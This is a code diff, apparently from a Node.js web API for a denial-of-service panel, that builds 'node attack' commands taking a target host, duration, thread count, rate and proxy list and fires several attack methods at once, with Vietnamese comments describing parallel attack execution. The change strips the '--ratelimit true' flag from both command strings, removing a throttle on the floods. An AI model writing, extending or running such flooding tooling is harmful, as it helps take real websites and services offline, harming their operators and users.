@@ -40,7 +40,7 @@ const executeAttack = (command) => {
 
 const executeAllAttacks = (methods, host, time, threads, rate) => {
   const commands = methods.map((method) => {
-    return `node attack -m ${method} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true`;
+    return `node attack -m ${method} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true`;
   });
 
   // Thực thi tất cả các lệnh tấn công song song mà không chờ kết quả
@@ -75,7 +75,7 @@ app.get("/api/attack", (req, res) => {
       pid: currentPID 
     });
   } else {
-    const command = `node attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true --ratelimit true`;
+    const command = `node attack -m ${modul} -u ${host} -s ${time} -t ${threads} -r ${rate} -p live.txt --full true`;
     executeAttack(command);  // Chạy tấn công cho modul không phải FULL
     res.status(200).json({ 
       status: "SUCCESS", 
